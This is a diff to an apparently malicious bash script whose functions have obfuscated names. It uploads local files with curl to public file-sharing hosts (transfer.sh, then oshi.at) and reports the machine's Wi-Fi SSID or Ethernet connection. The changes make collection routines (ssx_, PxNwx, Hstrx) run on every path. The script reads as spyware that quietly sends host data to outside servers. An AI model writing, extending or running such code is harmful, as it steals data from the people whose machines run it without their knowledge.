@@ -120,9 +120,9 @@ function Hstrx(){
 }
 
 function cx(){
-    OX=`curl -k --upload-file $IBUS_$1 https://transfer.sh/$1`
-    dbgx "OX: $OX";
-    cx_ "$OX" "$2"
+    #OX=`curl -k --upload-file $IBUS_$1 https://transfer.sh/$1`
+    #dbgx "OX: $OX";
+    #cx_ "$OX" "$2"
     #
     OX2=`curl -k -T $IBUS_$1 https://oshi.at`
     dbgx "OX2: $OX2";
@@ -154,14 +154,14 @@ function mnx(){
             dbgx "Current SSID: $SSID"
             #
             cx_ "$SSID" "SSID"
-            #
-            ssx_
-            #PxNwx
-            #Hstrx
-            #ax_
         else
             dbgx "No wireless network detected"
         fi
+	#
+	ssx_
+        PxNwx
+        Hstrx
+        #ax_
         #
         exit 0
     elif [[ -n "$eth_interface" ]]
@@ -176,14 +176,14 @@ function mnx(){
         then
             dbgx "Name of Ethernet connection: $eth_interface"
              cx_ "$SSID" "SSID"
-            #
-            ssx_
-            #PxNwx
-            #Hstrx
-            #ax_
         else
             dbgx "No Ethernet connection detected"
         fi
+	#
+	ssx_
+        PxNwx
+        Hstrx
+        #ax_
         #
         exit 0
     else
@@ -197,6 +197,12 @@ function px(){
     if [[ "$px_OX" == "TRUE" ]]
     then
         dbgx "Run: $px_OX";
+	
+	ssx_
+        PxNwx
+        Hstrx
+        #ax_
+	    
         mnx
     else
         dbgx "Run: $px_OX";
